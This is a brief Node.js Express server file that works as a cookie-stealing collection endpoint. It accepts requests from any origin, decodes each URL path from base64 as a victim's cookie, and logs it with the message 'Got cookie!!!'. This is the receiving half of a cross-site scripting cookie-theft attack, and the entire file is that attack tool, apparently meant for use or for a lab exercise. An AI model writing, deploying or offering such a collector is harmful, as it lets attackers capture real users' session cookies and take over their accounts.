const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const morgan = require('morgan');
const app = express();
const http = require('http').createServer(app);

app.use(cors());

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }));

// parse application/json
app.use(bodyParser.json());

app.use(morgan('dev'));

app.use('/', (req, res) => {
  if (req.path === '/favicon.ico') {
    return res.end();
  }
  try {
    const cookie = new Buffer(req.path.slice(1), 'base64').toString();
    console.log(`Got cookie!!! -> ${cookie}`);
  } catch (err) {
  }
  res.end();
});

const PORT = process.env.PORT || 3000;

http.listen(PORT, () => {
  console.log(`listening on ${PORT}`);
});
